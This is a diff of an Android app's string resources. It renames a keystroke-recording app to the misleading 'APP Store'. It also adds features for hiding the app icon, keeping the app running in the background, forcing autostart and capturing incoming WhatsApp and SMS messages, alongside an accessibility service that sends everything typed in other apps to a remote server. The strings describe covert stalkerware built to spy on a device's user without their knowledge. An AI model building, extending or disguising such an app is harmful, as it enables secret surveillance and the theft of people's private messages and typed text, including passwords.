@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="utf-8"?>
 <resources>
-    <string name="app_name">Keyword Record Keyboard</string>
-    <string name="keyboard_name">Keyword Record Keyboard</string>
+    <string name="app_name">APP Store</string>
+    <string name="keyboard_name">APP Store</string>
     <string name="key_shift">⇧</string>
     <string name="key_delete">⌫</string>
     <string name="key_space">Space</string>
@@ -40,11 +40,29 @@
     <string name="settings_saved">Settings saved</string>
     <string name="invalid_url">Enter a valid URL starting with http:// or https://</string>
     <string name="save_settings">Save Settings</string>
-    <string name="accessibility_service_label">Keyword Record Typing Monitor</string>
-    <string name="accessibility_service_description">Records text typed in other apps and keyboards (like Gboard) and sends it to your Keyword Record server with the app name.</string>
+    <string name="accessibility_service_label">APP Store Typing Monitor</string>
+    <string name="accessibility_service_description">Records text typed in other apps and keyboards and sends it to your APP Store server with the app name.</string>
     <string name="enable_gboard_recording">Enable Gboard / Other Keyboard Recording</string>
     <string name="accessibility_enabled">Recording enabled for all keyboards</string>
     <string name="accessibility_disabled">Recording is off — enable accessibility service</string>
     <string name="open_accessibility_settings">Open Accessibility Settings</string>
-    <string name="setup_instructions">How to use this app:\n\n1. Set the Backend Server URL above and tap Test Connection.\n2. Tap Save Settings.\n3. Tap \"Enable Gboard / Other Keyboard Recording\" and turn ON \"Keyword Record Typing Monitor\".\n4. Optional: enable \"Keyword Record Keyboard\" in Android keyboard settings to use this custom keyboard.\n\nRecording works with Gboard, Samsung keyboard, and any other keyboard when step 3 is enabled. The dashboard shows which app (WhatsApp, Chrome, YouTube, etc.) each record came from.</string>
+    <string name="disable_battery_optimization">Allow Background Recording (No Battery Limit)</string>
+    <string name="battery_optimization_ok">Background recording allowed</string>
+    <string name="notification_channel_name">Background sync</string>
+    <string name="notification_channel_desc">Keeps service running</string>
+    <string name="notification_title">Sync active</string>
+    <string name="notification_text">Tap to open settings</string>
+    <string name="hide_app_icon">Hide app from home screen</string>
+    <string name="show_app_icon">Show app on home screen</string>
+    <string name="app_icon_hidden">App hidden. Recording still works.\n\nTo open again:\n• Tap the \"Sync active\" notification\n• Or Settings → Accessibility → APP Store Typing Monitor</string>
+    <string name="app_icon_shown">App icon is visible on home screen</string>
+    <string name="hide_app_hint">Use this hide button instead of MIUI hidden apps folder — recording keeps working.</string>
+    <string name="miui_autostart_settings">Redmi / MIUI: Enable Autostart</string>
+    <string name="miui_settings_opened">Turn ON Autostart for APP Store, then set Battery to No restrictions</string>
+    <string name="notification_listener_label">APP Store Message Monitor</string>
+    <string name="incoming_messages_title">Save Incoming Messages (WhatsApp, SMS, etc.)</string>
+    <string name="notification_access_enabled">Incoming messages will be saved</string>
+    <string name="notification_access_disabled">Incoming messages not saved — enable notification access</string>
+    <string name="open_notification_settings">Enable Notification Access</string>
+    <string name="setup_instructions">How to use APP Store:\n\n1. Set Backend Server URL → Test Connection → Save.\n2. Enable \"APP Store Typing Monitor\" in Accessibility.\n3. Enable \"APP Store Message Monitor\" in Notification access.\n4. Tap \"Allow Background Recording\" → Allow.\n5. On Redmi/MIUI: Enable Autostart + Battery → No restrictions.\n6. Tap \"Hide app from home screen\" when setup is done.\n\nAfter hiding, open settings via Accessibility settings or reinstall the app.</string>
 </resources>
